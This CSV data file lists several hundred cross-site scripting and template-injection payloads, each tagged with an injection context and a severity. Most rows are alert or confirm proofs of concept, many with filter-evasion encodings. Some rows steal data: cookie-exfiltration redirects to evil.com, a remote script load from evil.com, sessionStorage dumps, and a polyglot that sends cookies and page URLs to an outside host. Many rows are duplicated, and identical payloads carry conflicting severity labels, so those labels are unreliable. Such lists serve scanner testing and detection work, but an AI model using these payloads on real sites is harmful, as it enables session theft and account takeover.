payload,context,severity
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"javascript:void(document.location=""http://evil.com"")",template_injection,low
"<img src
=x onerror
=alert(	1)>",script_injection,high
' onerror=alert(1) x=',attribute,low
<img/src=x onerror=\u0061\u006cert(1)//>,event_handler,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<svgonload=alert(1)>,html_body,medium
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
javascript:alert(	document.domain),js_uri,low
' ><img src=x onerror=alert(1)>,tag_injection,high
' ><img src=x onload=alert(1)>,attribute,medium
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
%3Cimg/src=%3Dx+onload=alert(2)%3D,html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
<%= alert(1) %>,event_handler,low
${alert(1)},template_injection,low
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,high
confirm(),html_body,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",html_body,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,high
\' onerror=alert(1)//,attribute_escape,medium
' onmouseover=alert(1) ',attribute,low
innerHTML=location.hash>#<script>confirm(1)</script>,html_body,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<svg onload=alert(1)>,event_handler,high
""" onfocus=alert(1) autofocus=""",attribute,high
"onerror=""top.alert(1)""",html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
alert(2),html_body,medium
"""><svg onload=alert()>",html_body,medium
<svg src=x onerror=alert(1)>,tag_injection,high
'});alert(document.cookie);//',js_block,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
#{alert(1)},template_injection,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,low
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",attribute_escape,low
javascr/**/ipt:confirm(1),js_uri,low
onwheel='alert(1)',html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
"""><svg
 onload=alert()>",html_body,medium
"mrco24""type=image src onerror=""alert(1)""",html_body,medium
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"<iframe>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
<SCRIPT>alert(	1)</SCRIPT>,script_injection,high
"eval(""alert(1)"")",dom_sink,low
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
' onerror=alert(1) x=',attribute,high
""" onfocus=alert(1) autofocus=""",attribute,high
<img/src=x onerror=alert(1)//>,js_uri,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
<img src=x onerror=alert(1)>,template_injection,low
prompt(9),html_body,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
prompt(9),html_body,medium
<m\u0061rquee onst\u0061rt=\u0061\u006cert(1)>,event_handler,medium
;confirm`1`;,attribute,medium
<%= alert(1) %>,template_injection,high
<SCRIPT>confirm(1)</SCRIPT>,script_injection,medium
%3Csvg%20onload=alert(%22MrHex88%22)%3E,html_body,medium
""" onfocus=alert(1) autofocus=""",attribute,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
onerror=alert;throw 23;,html_body,low
%3cimg onerror=alert(1) src=a%3e,html_body,medium
${alert(1)},template_injection,high
"""><img src=x onerror=confirm(1)>",attribute,high
"#""><Svg oNlOAD=ALErt(1)>",attribute,medium
prompt(9),html_body,medium
<img src/onerror=alert(1)>,html_body,medium
<svgonload=alert(1)>,html_body,medium
javascript:confirm(1),js_uri,high
onerror=alert;throw 23;,html_body,low
<%= alert(1) %>,template_injection,medium
"<object data=""javascript:alert(1)"">",attribute_escape,low
<svg ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
\' onerror=confirm(1)//,attribute_escape,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
<iframe/onload=alert(0);>,html_body,medium
<body onload=alert(1)>,event_handler,high
<svgonload=alert(1)>,html_body,medium
"<iframe src=""javascript:alert(1)"">",tag_injection,low
javaScRipt:prompt`1`,url,medium
alert(2),html_body,medium
<script>prompt(1)</script>,script_injection,medium
<SCRIPT>al'+'ert(1)</SCRIPT>,script_injection,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
<scRIPt>d.innErHTML+='';</sCRipt>,html_body,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E,html_body,medium
{{7*7}},template_injection,high
onerror='alert(1)',html_body,medium
prompt(9),html_body,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
' \x3e\x3cimg src=x onerror=alert(1)\x3e,attribute,low
"""><svg onload=alert()>",html_body,medium
javascript:alert(document.domain),js_uri,high
<%= alert(1) %>,template_injection,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
confirm(),html_body,medium
"eval(""alert(1)"")",dom_sink,high
"?alert(1)"",",html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
' onerror=alert(1) x=',dom_sink,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
<body onload=alert(1)>,event_handler,medium
"<object data=""javascript:confirm(1)"">",js_uri,medium
#{alert(1)},template_injection,low
"""><svg onmouseenter=alert(1)>",attribute,medium
<script>confirm(document.domain)</script>,script_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,low
<img src/onerror=prompt(8)>,html_body,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
<svg/onload=alert(1)>,tag_injection,medium
javascript:alert(document.domain),js_uri,low
javascript:alert(1),attribute_escape,medium
j\u0061v\u0061script:\u0061\u006cert(1),js_uri,high
<svgonload=alert(1)>,html_body,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",html_body,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<svgonload=alert(1)>,html_body,medium
#{alert(1)},template_injection,high
{{_s.constructor('alert(1)')()}},js_block,medium
"mrco24""type=image src onerror=""alert(1)""",html_body,medium
""" onerror=alert(1) x=""",attribute,medium
<SCRIPT>al'+'ert(1)</SCRIPT>,script_injection,low
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
alert(2),html_body,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,high
"\"" onerror=alert(1)//",attribute_escape,high
<script>alert(document.domain)</script>,script_injection,high
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,medium
setInterval('ale'+'rt(10)');,html_body,high
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
"\"" onerror=\u0061\u006cert(1)//",attribute_escape,low
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<iframe/onload=alert(0);>,html_body,medium
<script>prompt(1)</script>,event_handler,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
"data:text/html,<script>alert(1)</script>",template_injection,low
<img src=x onerror=alert(1)>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,attribute,high
"""><svg onload=alert()>",html_body,medium
<img src=x onerror=confirm(1)>,tag_injection,high
&quot; onerror=alert(1) x=&quot;,event_handler,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
\' onerror=alert(1)//,attribute_escape,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
<img src/onerror=alert(1)>,html_body,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<%= al'+'ert(1) %>,template_injection,low
"<iframe src=""javascript:confirm(1)"">",script_injection,medium
onload&#61;'alert(1)',html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",attribute,medium
onerror='alert(1)',html_body,medium
javaSCRIPT:confirm(1),js_uri,low
"""><script alert(String.fromCharCode(88,83,83))</script>",html_body,high
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
' %3E%3Cimg src=x onerror=alert(1)%3E,tag_injection,medium
onlOAD='aleRt(1)',attribute,medium
"data:text/html,<script>alert(1)</script>",js_uri,medium
"<svg onload=""confirm(7)"">",html_body,medium
<%= alert(1) %>,template_injection,low
"<embed src=""javascript:al'+'ert(1)"">",tag_injection,medium
"""><a>a</a><img src=x onerror=alert(document.cookie)>{{9-9}}';alert(0);://",js_block,high
onload='prompt(1)',html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
#{al'+'ert(1)},template_injection,low
<svg////////onload=alert(1)>,html_body,medium
"""><script/ alert(String.fromCharCode(88,83,83))</script>",html_body,high
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
alert(1);,html_body,medium
alert(1);,html_body,medium
onerror=print();>,html_body,medium
""" onload=alert(1) x=""",attribute,medium
\' onerror=alert(1)//,event_handler,low
onerror=”alert(‘AnonKryptiQuz’),html_body,medium
javascript:confirm(1),js_uri,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
-alert(23)/,html_body,medium
"""><img src=x onerror=alert(1)>",attribute,medium
""" oNeRrOr=aLeRt(1) X=""",template_injection,low
javascript:alert(1),js_uri,high
"onloaD=""ALerT(1)""",html_body,medium
' ><img src=x onerror=alert(1)>,attribute,low
<%= alert(1) %>,template_injection,high
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",url,high
"setTimeout(	""alert(	1)"",0)",dom_sink,low
<svg/onload=alert(1)>,tag_injection,medium
"<embed src=""javascript:confirm(1)"">",attribute,medium
prompt(9),html_body,medium
"<iframe>alert(String.fromCharCode(88,83,83))</script>",html_body,high
javascr/**/ipt:alert(document.domain),js_uri,medium
&lt;img src=x onerror=alert(1)&gt;,tag_injection,low
javascript:alert(1),js_uri,low
"setTimeout(""alert(1)"",0)",dom_sink,high
onerror=alert(0);>,html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
<body onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,event_handler,medium
onerror=alert(0);>,html_body,medium
' ><img src=x onerror=\u0061\u006cert(1)>,js_uri,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",html_body,high
<img/src/onerror=alert(1),html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
j\u0061v\u0061script:\u0061\u006cert(1),js_uri,low
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
javascript:alert(document.domain),js_uri,high
<details open ontoggle=alert(1)>,event_handler,high
"eval(""alert(1)"")",dom_sink,medium
<script>prompt(1)</script>,script_injection,low
"eval(""al'+'ert(1)"")",dom_sink,medium
confirm(),html_body,medium
<input onfocus=confirm(1) autofocus>,event_handler,low
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",html_body,high
""" oNlOaD=AlErT(1) x=""",attribute,low
"alert`1`)//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<iframe/onload=alert(0);>,html_body,medium
""" onfocus=alert(1) autofocus=""",attribute,low
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",html_body,high
<img src/onerror=prompt(8)>,html_body,medium
"{{constructor.constructor(""confirm(1)"")()}}",dom_sink,high
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,medium
onload='alert(1)',html_body,medium
"""><svg onload=alert()>",html_body,medium
' ><img src=x onload=alert(1)>,attribute,low
' onerror=alert(1) x=',attribute,medium
"javascript:void(document.location=""http://evil.com"")",tag_injection,medium
<body onload=alert(1)>,event_handler,high
"onerror=""alert(1)""",html_body,medium
<BODY ONLOAD=alert(’XSS’)>,html_body,medium
javascript:alert(document.domain),js_uri,low
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
"<object data=""javascript:alert(1)"">",dom_sink,low
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
alert(2),html_body,medium
"&lt;script&gt;document.location=""http://evil.com/?c=""+document.cookie&lt;/script&gt;",script_injection,low
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
%3cimg onerror=prompt(1) src=a%3e,attribute,medium
<svg onload=alert(1)>,dom_sink,medium
"""><svg onload=alert()>",html_body,medium
"<script
>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"""><svg onload=alert()>",html_body,medium
"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
\x3cdetails open ontoggle=alert(1)\x3e,event_handler,low
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
"\""><img src=x onerror=confirm(1)>",event_handler,medium
"<iframe src=""javascript:alert(1)"">",event_handler,high
"javascript://'/</TitLE></sTYlE></tEXTaREA></SCriPt>--><p"" %0D %0A oNcLicK=alErt(123)//>*/ALErT()/*<imG srC=X OnerrOR=alERt(456)/><sVG/OnLoad=PRoMpt(789)/>;'""// :;fn();%0a%0d\N\r\T{{12*12+'aUDI Rs5'.suBStr(0,4)}}XxX<scriPt>alERT('anONKRYpTiQUZ')<Img SRc=x oNERRoR='(fUnCtIoN s(){vaR I=NEW IMAGe();I.srC='httP://Bl4dE.TECh/BxsS.pHp?c='+doCuMENT.CooKiE+';'+EncoDeURicOMpOnENt(lOcation.href);DOcumENT.BOdy.appEND(i)})()'/>#JavaScripT:/*-/*`/*\\`/*'/*\""/**/(/* */OncLiCK=ALeRt() )//%0d%0a%0D%0A//</StyLe/</titlE/</teXtaReA/</SCrIPt/--!>\\X3CSVg/<sVg/oNLOAD=aLErt()//>\\x3E",js_block,high
"data:text/html,<script>alert(1)</script>",js_uri,medium
innerHTML=location.hash>#<script>alert(1)</script>,attribute,high
onload='self.alert(1)',html_body,medium
onerror=prompt(1);>,html_body,medium
"\"" onerror=alert(1)//",attribute,medium
"onbeforeinput=""alert(1)""",attribute,medium
"eval(""alert(1)"")",dom_sink,high
"#""><svg onload=alert(1)>",attribute,medium
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<details open ontoggle=alert(1)>,event_handler,low
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
"javascript:void(document.location=""http://evil.com"")",attribute_escape,low
"location=""javascript:alert(1)""",dom_sink,high
{{7*7}},template_injection,low
<script>confirm(1)</script>,script_injection,high
' onmouseover=alert(1) ',attribute,high
{{7*7}},template_injection,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
<img src/onerror=alert(1)>,html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",attribute,high
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
"data:text/html,<script>alert(1)</script>",js_uri,medium
<body onload=alert(1)>,event_handler,high
<svgonload=alert(1)>,html_body,medium
"<iframe src=""javascript:alert(1)"">",js_uri,medium
onmouseenter='alert(1)',attribute,medium
"%20""><svg onload=alert(1)>",html_body,medium
%3Csvg/onload=alert(1)%3E,tag_injection,low
onload=”alert(‘AnonKryptiQuz’),html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
\x3csvg onload=alert(1)\x3e,attribute_escape,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
"\""><img src=x onerror=confirm(1)>",attribute_escape,high
setInterval('ale'+'rt(10)');,html_body,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
<svg id=1 onload=confirm(1)>,html_body,medium
<svg onload=alert()>,html_body,medium
"onerror=""confirm(1)""",attribute,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
<video src=x onerror=alert(1)>,event_handler,low
${aLeRt(1)},template_injection,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
<svg src=x onerror=alert(1)>,tag_injection,high
<script>al'+'ert(document.domain)</script>,script_injection,high
"<%00script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<svgonload=alert(1)>,html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"<svg/onload=alert(String.fromCharCode(88,83,83))>",html_body,high
"""><svg onload=alert()>",html_body,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",attribute,high
<select ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"<svg>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
"""><sCrIpT AlERT(STring.fRomcHaRCoDe(88,83,83))</ScRipT>",html_body,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
""" onfocus=al'+'ert(1) autofocus=""",attribute,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
""" onload=alert(1) x=""",attribute,medium
<script>confirm(1)</script>,script_injection,high
onerror=alert(0);>,html_body,medium
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
"<object data=""javascript:alert(1)"">",tag_injection,medium
""" onerror
=alert(	1) x
=""",attribute,low
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
<script>alert(document.domain)</script>,js_uri,low
+alert(1)+,html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<SCRIPT>prompt(1)</SCRIPT>,attribute,low
onload=”alert(‘AnonKryptiQuz’),html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",attribute,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
"< vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
<svg////////onload=alert(1)>,html_body,medium
%3Cvideo src=x onerror=alert(1)%3E,event_handler,low
' ><img src=x onerror=alert(1)>,attribute,medium
;alert(1);,html_body,medium
"""><embed alert(String.fromCharCode(88,83,83))</script>",html_body,high
"<object data=""javascript:alert(1)"">",tag_injection,low
""" onfocus
=alert(	1) autofocus
=""",event_handler,low
</tag><svg onload=alert(1)>,html_body,medium
<img src/onerror=alert(1)>,html_body,medium
onerror='alert(1)',html_body,medium
setInterval('ale'+'rt(10)');,html_body,high
""" onload=alert(1) x=""",attribute,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
""" onerror=alert(1) x=""",attribute,low
"onload=""alert(1)""",html_body,medium
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",js_uri,high
"\"" onerror=alert(1)//",dom_sink,medium
.alert(1);,html_body,medium
"location=""javascript:alert(1)""",dom_sink,low
"<script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
onerror='alert(1)',html_body,medium
"location=""javascript:al'+'ert(1)""",tag_injection,medium
"""><img src
=x onerror
=alert(	1)>",attribute,high
""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
jAvAsCrIpT:CoNfIrM(1),tag_injection,high
